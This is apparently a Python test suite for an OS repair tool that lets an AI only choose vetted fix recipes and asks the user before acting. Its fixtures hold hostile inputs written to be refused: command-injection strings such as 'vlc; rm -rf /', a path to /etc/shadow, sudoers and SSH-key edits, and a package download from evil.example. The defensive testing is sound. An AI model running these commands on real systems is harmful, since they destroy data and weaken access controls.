"""DecKoOS fixes (heal.py): an AI may only pick a vetted recipe and fill its blanks. Hostile blanks, unknown recipes
and anything touching sudo, polkit, PAM, SSH, passwords or the firewall are refused, and the Assistant runs nothing
the person declines."""
import json
import sys
import unittest
from pathlib import Path
from unittest.mock import patch

LIB = Path(__file__).resolve().parents[1] / 'pkg/deckos-settings/rootfs/usr/lib/deckos'
sys.path[:0] = [str(LIB / 'heal'), str(LIB / 'assistant')]
import heal  # noqa: E402
import heal_report  # noqa: E402
import assistant  # noqa: E402

IN_REPOS = {'vlc', 'mesa', 'intel-ucode'}.__contains__
SAMPLES = {'install-package': {'package': 'vlc'}, 'repair-package': {'package': 'mesa'},
           'restart-user-service': {'unit': 'pipewire.service'}, 'restart-system-service': {'unit': 'bluetooth.service'},
           'display-fix-level': {'level': '2'}, 'undo-update': {'snapshot': '42'}}


class RecipeTests(unittest.TestCase):
    def test_every_recipe_plans(self):
        for rid in heal.RECIPES:
            with self.subTest(recipe=rid):
                p = heal.plan(rid, SAMPLES.get(rid, {}), check=IN_REPOS, home='/home/someone')
                self.assertTrue(p['steps'])
                self.assertEqual(p['snapshot'], p['root'] and rid != 'undo-update')

    def test_hostile_blanks(self):
        for rid, values in (('install-package', {'package': 'vlc; rm -rf /'}), ('install-package', {'package': 'yay'}),
                            ('install-package', {'package': '../../etc/shadow'}), ('install-package', {'package': '-Syu'}),
                            ('install-package', {'package': '$(id)'}), ('restart-system-service', {'unit': 'sshd.service'}),
                            ('restart-user-service', {'unit': 'pipewire.service --now'}),
                            ('display-fix-level', {'level': '9'}), ('display-fix-level', {'level': '1 && id'}),
                            ('undo-update', {'snapshot': '-1'}), ('rm-everything', {}),
                            ('skip-network-wait', {'unit': 'x'})):
            with self.subTest(recipe=rid, values=values):
                with self.assertRaises(heal.Refused):
                    heal.plan(rid, values, check=IN_REPOS)

    def test_the_deny_list_is_a_second_wall(self):
        # Even a bad recipe added by mistake can't touch what no fix may
        for step in (['chmod', '777', '/etc/sudoers'], ['cp', 'x', '/etc/polkit-1/rules.d/00.rules'],
                     ['usermod', '-aG', 'wheel', 'mia'], ['curl', 'http://example.com/x'], ['bash', '-c', 'id'],
                     ['systemctl', 'disable', 'firewalld.service'], ['tee', '/home/x/.ssh/authorized_keys']):
            bad = {'title': 'bad', 'why': '', 'params': {}, 'root': True, 'steps': [step]}
            with self.subTest(step=step), patch.dict(heal.RECIPES, {'bad': bad}):
                with self.assertRaises(heal.Refused):
                    heal.plan('bad', {})

    def test_root_fixes_need_root(self):
        p = heal.plan('skip-network-wait', {})
        with patch.object(heal.os, 'geteuid', return_value=1000), self.assertRaises(heal.Refused):
            heal.apply(p)


class ReportTests(unittest.TestCase):
    HW = {'deckos': '0.13.1', 'kernel': '6.18', 'cpu': 'AMD Ryzen 7 7800X3D', 'gpu': 'AMD Radeon RX 9070 XT'}

    def test_outcomes_are_remembered(self):
        import tempfile
        with tempfile.TemporaryDirectory() as d:
            f = Path(d) / 'heal.jsonl'
            heal_report.record('skip-network-wait', 'worked', 'slow-boot', path=f)
            heal_report.record('clear-shader-cache', 'failed', '', path=f)
            h = heal_report.history(f)
        self.assertEqual([(e['recipe'], e['result']) for e in h],
                         [('skip-network-wait', 'worked'), ('clear-shader-cache', 'failed')])

    def test_report_is_scrubbed_and_complete(self):
        entry = {'recipe': 'skip-network-wait', 'result': 'worked', 'finding': 'slow-boot', 'time': 0}
        hw = dict(self.HW, gpu='AMD Radeon RX 9070 XT at 192.168.1.20 for /home/alex')
        with patch.dict(heal_report.os.environ, {'USER': 'alex'}):
            title, body = heal_report.report_text(entry, hw)
        self.assertIn('slow-boot', title)
        self.assertIn('it worked', body)
        self.assertNotIn('192.168', body)
        self.assertNotIn('/home/alex', body)
        url = heal_report.issue_url(title, body)
        self.assertIn('template=heal.yml', url)
        self.assertIn('report=', url)

    def test_triage_groups_reports(self):
        def issue(n, finding, recipe, result, gpu):
            _, body = heal_report.report_text({'recipe': recipe, 'result': result, 'finding': finding, 'time': 0},
                                              dict(self.HW, gpu=gpu))
            return {'number': n, 'title': 't', 'body': '### Report\n\n' + body}
        groups = heal_report.triage([
            issue(1, 'slow-boot', 'skip-network-wait', 'worked', 'AMD Radeon RX 9070 XT'),
            issue(2, 'slow-boot', 'skip-network-wait', 'worked', 'NVIDIA GeForce RTX 5070 Ti'),
            issue(3, 'slow-boot', 'skip-network-wait', 'failed', 'AMD Radeon 780M'),
            issue(4, 'gpu-reset', 'display-fix-level', 'worked', 'AMD Radeon RX 9070 XT'),
            {'number': 5, 'title': 'not a report', 'body': 'hello'}])
        self.assertEqual([(g['finding'], g['reports'], g['worked']) for g in groups],
                         [('slow-boot', 3, 2), ('gpu-reset', 1, 1)])
        self.assertEqual(groups[0]['vendors'], {'amd': 2, 'nvidia': 1})
        self.assertEqual(groups[0]['issues'], [1, 2, 3])


class DraftTests(unittest.TestCase):
    GROUP = {'finding': 'unit:bluetooth', 'recipe': 'restart-system-service', 'reports': 9, 'worked': 8,
             'vendors': {'amd': 5, 'nvidia': 4}, 'issues': [1]}

    def draft(self, reply):
        return heal_report.draft(self.GROUP, lambda _prompt: reply, save=False)

    def test_the_library_passes_its_own_checker(self):
        for rid, r in heal.RECIPES.items():
            with self.subTest(recipe=rid):
                self.assertTrue(heal.check_recipe(rid, r))

    def test_a_good_draft_passes(self):
        rid, r = self.draft('Here: {"id": "restart-bluetooth", "title": "Restart Bluetooth", "why": "It stopped",'
                            ' "root": true, "params": {}, "steps": [["systemctl", "restart", "bluetooth.service"]]}')
        self.assertEqual(rid, 'restart-bluetooth')
        self.assertNotIn('restart-bluetooth', heal.RECIPES)  # drafts are never added by themselves

    def test_an_existing_recipe_is_reused(self):
        rid, r = self.draft('{"id": "restart-system-service", "title": "x", "why": "x", "root": true,'
                            ' "params": {}, "steps": [["systemctl", "restart", "x"]]}')
        self.assertIs(r, heal.RECIPES['restart-system-service'])

    def test_malicious_or_sloppy_drafts_are_refused(self):
        base = {"id": "bad-one", "title": "t", "why": "w", "root": True, "params": {}}
        for steps, params in (
                ([["bash", "-c", "id"]], {}),                                      # a program not on the list
                ([["systemctl", "restart", "sshd.service"]], {}),                  # deny list
                ([["pacman", "-U", "http://evil.example/x.pkg.tar.zst"]], {}),     # a download
                ([["deckos", "undo", "--x={n}"]], {"n": ["int", 1, 5]}),           # a blank inside a word
                ([["systemctl", "restart", "{unit}"]], {"unit": "anything"}),      # a free-text blank
                ([["systemctl", "restart", "{unit}"]], {"unit": ["ok.service", "x; id"]}),  # a value that isn't plain
                ([["find", "/etc/sudoers.d", "-delete"]], {}),                     # deny list
                ([["pacman", "-R", "sudo"]], {}),                                  # pacman only installs
                ([["systemctl", "mask", "bluetooth.service"]], {}),                # systemctl only starts things
                ([["deckos", "kids", "remove", "mia"]], {}),                        # deckos: fix commands only
                ([["systemctl"]] * 5, {})):                                        # too many steps
            with self.subTest(steps=steps):
                with self.assertRaises(heal.Refused):
                    self.draft(json.dumps({**base, "steps": steps, "params": params}))

    def test_no_fix_or_no_json(self):
        with self.assertRaises(heal.Refused):
            self.draft('{"none": "this needs a kernel patch"}')
        with self.assertRaises(ValueError):
            self.draft('I would restart it.')


class AssistantTests(unittest.TestCase):
    def tools(self, answer):
        asked = []
        t = assistant.Tools(confirm=lambda title, detail: asked.append((title, detail)) or answer)
        return t, asked

    def test_offered_to_the_model(self):
        t, _ = self.tools(True)
        names = [s['function']['name'] for s in t.schemas()]
        self.assertIn('use_fix', names)

    def test_refused_fix_never_asks_or_runs(self):
        t, asked = self.tools(True)
        with patch.object(assistant, 'run') as run:
            out = t.call('use_fix', {'fix': 'install-package', 'values': {'package': 'vlc; rm -rf /'}})
        self.assertIn('refused', out)
        self.assertEqual(asked, [])
        run.assert_not_called()

    def test_declined_fix_runs_nothing(self):
        t, asked = self.tools(False)
        with patch.object(assistant, 'run') as run:
            out = t.call('use_fix', {'fix': 'rebuild-font-cache'})
        self.assertEqual(out, 'the person said no')
        self.assertIn('fc-cache -f', asked[0][1])  # they saw the exact command
        run.assert_not_called()

    def test_root_fix_goes_through_pkexec(self):
        t, _ = self.tools(True)
        with patch.object(assistant, 'run', return_value=(0, 'ok')) as run:
            t.call('use_fix', {'fix': 'skip-network-wait'})
        self.assertEqual(run.call_args[0][0][:4], ['pkexec', 'deckos', 'heal', 'apply'])


if __name__ == '__main__':
    unittest.main()
